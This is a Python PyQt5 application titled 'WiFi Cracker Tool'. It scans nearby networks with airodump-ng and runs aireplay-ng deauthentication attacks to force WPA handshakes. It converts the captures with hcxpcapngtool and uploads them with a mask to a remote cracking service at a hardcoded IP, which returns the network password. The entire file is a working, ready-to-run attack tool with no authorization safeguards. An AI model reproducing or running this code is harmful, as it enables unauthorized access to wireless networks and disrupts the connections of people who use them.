import sys
import subprocess
import requests
import csv
from PyQt5.QtWidgets import (QApplication, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QTableWidget, QTableWidgetItem, QLabel, QInputDialog, QMessageBox, QHeaderView)
import re
import os
import time

class WiFiCrackerApp(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        # Set up the window
        self.setWindowTitle('WiFi Cracker Tool')
        self.setGeometry(100, 100, 1200, 600)

        # Create layout
        main_layout = QVBoxLayout()
        list_layout = QHBoxLayout()

        # WiFi networks table
        self.networks_table = QTableWidget()
        self.networks_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.networks_table.setColumnCount(3)
        self.networks_table.setHorizontalHeaderLabels(['SSID', 'BSSID', 'Channel'])
        self.networks_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
        self.networks_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.Stretch)
        self.networks_table.horizontalHeader().setSectionResizeMode(2, QHeaderView.ResizeToContents)
        self.networks_table_label = QLabel("WiFi Networks")
        list_layout.addWidget(self.networks_table_label)
        list_layout.addWidget(self.networks_table)

        # Add buttons
        self.monitor_button = QPushButton('Monitor for Handshake')
        self.monitor_button.clicked.connect(self.monitor_handshake)

        self.deauth_button = QPushButton('Run Deauth Attack')
        self.deauth_button.clicked.connect(self.run_deauth)

        self.refresh_button = QPushButton('Refresh Networks')
        self.refresh_button.clicked.connect(self.refresh_networks)

        # Add widgets to layout
        main_layout.addLayout(list_layout)
        main_layout.addWidget(self.monitor_button)
        main_layout.addWidget(self.deauth_button)
        main_layout.addWidget(self.refresh_button)

        self.setLayout(main_layout)

    def refresh_networks(self):
        # Scan for available WiFi networks using airodump-ng and output to CSV
        try:
            csv_file = 'output_files/networks-01.csv'
            if os.path.exists(csv_file):
                os.remove(csv_file)

            # Start airodump-ng process
            process = subprocess.Popen(['airodump-ng', 'wlan0mon', '-w', 'output_files/networks', '--output-format', 'csv'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            # Allow it to run for 3 seconds
            time.sleep(3)
            # Terminate the process after 3 seconds
            process.terminate()

            # Read the generated CSV file after 3 seconds
            time.sleep(3)
            if not os.path.exists(csv_file):
                QMessageBox.critical(self, 'Error', 'CSV file not generated.')
                return

            with open(csv_file, 'r') as f:
                reader = csv.reader(f)
                self.networks_table.setRowCount(0)
                for row in reader:
                    # Skip empty lines or lines without enough data
                    if len(row) < 14 or row[0] == 'BSSID' or not row[0].strip():
                        continue
                    try:
                        bssid = row[0].strip()
                        channel = row[3].strip()
                        ssid = row[13].strip() if row[13].strip() else "<Hidden SSID>"
                        row_position = self.networks_table.rowCount()
                        self.networks_table.insertRow(row_position)
                        self.networks_table.setItem(row_position, 0, QTableWidgetItem(ssid))
                        self.networks_table.setItem(row_position, 1, QTableWidgetItem(bssid))
                        self.networks_table.setItem(row_position, 2, QTableWidgetItem(channel))
                    except IndexError as e:
                        # Log parsing error for debugging
                        print(f"Error parsing row: {row} - {e}")
        except Exception as e:
            QMessageBox.critical(self, 'Error', f'Failed to refresh networks: {e}')

    def monitor_handshake(self):
        # Monitor the selected network for handshake
        selected_row = self.networks_table.currentRow()
        if selected_row == -1:
            QMessageBox.warning(self, 'Warning', 'Please select a WiFi network to monitor.')
            return

        ssid = self.networks_table.item(selected_row, 0).text()
        bssid = self.networks_table.item(selected_row, 1).text()
        channel = self.networks_table.item(selected_row, 2).text()
        try:
            # Run monitoring tool (e.g., airodump-ng) to capture handshake
            process = subprocess.Popen(['airodump-ng', '--bssid', bssid, '--channel', channel, '-w', 'output_files/capture', 'wlan0mon'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)

            # Monitor the output for WPA handshake
            while True:
                output = process.stdout.readline()
                print(output, end='')
                if 'WPA handshake' in output:
                    print('Handshake captured!')
                    time.sleep(2)
                    process.terminate()
                    break
            # Run monitoring tool (e.g., airodump-ng) to capture handshake
            
            # Convert the captured handshake using hcxpcapng
            subprocess.run(['hcxpcapngtool', '-o', 'output_files/handshake.hccapx', 'output_files/capture-01.cap'], check=True)

            # Prompt for mask
            mask, ok = QInputDialog.getText(self, 'Handshake Captured!', 'Enter mask:')
            if not ok or not mask:
                return

            # Send handshake to API
            with open('output_files/handshake.hccapx', 'rb') as f:
                handshake_data = f.read()

            response = requests.post('http://172.31.124.39:5000/crack_wifi', data={'handshake': handshake_data, 'mask': mask})
            cracked_password = response.json().get('cracked_password')

            # Show the cracked password
            QMessageBox.information(self, 'Cracked Password', f'Cracked Password: {cracked_password}')
        except Exception as e:
            QMessageBox.critical(self, 'Error', f'Failed to capture handshake: {e}')

    def run_deauth(self):
        selected_row = self.networks_table.currentRow()
        if selected_row == -1:
            QMessageBox.warning(self, 'Warning', 'Please select a WiFi network to deauthenticate.')
            return

        ssid = self.networks_table.item(selected_row, 0).text()
        bssid = self.networks_table.item(selected_row, 1).text()
        channel = self.networks_table.item(selected_row, 2).text()
        try:
            # Run deauth attack (e.g., aireplay-ng) and monitoring simultaneously
            deauth_process = subprocess.Popen(['aireplay-ng', '--deauth', '10', '-a', bssid, 'wlan0mon'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
            monitor_process = subprocess.Popen(['airodump-ng', '--bssid', bssid, '--channel', channel, '-w', 'output_files/capture', 'wlan0mon'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)

            # Monitor the output for WPA handshake
            while True:
                output = monitor_process.stdout.readline()
                print(output, end='')
                if 'WPA handshake' in output:
                    print('Handshake captured!')
                    time.sleep(2)
                    break

            # Convert the captured handshake using hcxpcapng
            subprocess.run(['hcxpcapngtool', '-o', 'output_files/handshake.hccapx', 'output_files/capture-01.cap'], check=True)

            # Prompt for mask
            mask, ok = QInputDialog.getText(self, 'Handshake Captured!', 'Enter mask:')
            if not ok or not mask:
                return

            # Send handshake to API
            with open('output_files/handshake.hccapx', 'rb') as f:
                handshake_data = f.read()

            response = requests.post('http://172.31.124.39:5000/crack_wifi', data={'handshake': handshake_data, 'mask': mask})
            cracked_password = response.json().get('cracked_password')

            # Show the cracked password
            QMessageBox.information(self, 'Cracked Password', f'Cracked Password: {cracked_password}')

            # Terminate processes after workflow is complete
            monitor_process.terminate()
            deauth_process.terminate()
            
        except Exception as e:
            QMessageBox.critical(self, 'Error', f'Failed to run deauth attack: {e}')

if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = WiFiCrackerApp()
    ex.show()
    sys.exit(app.exec_())
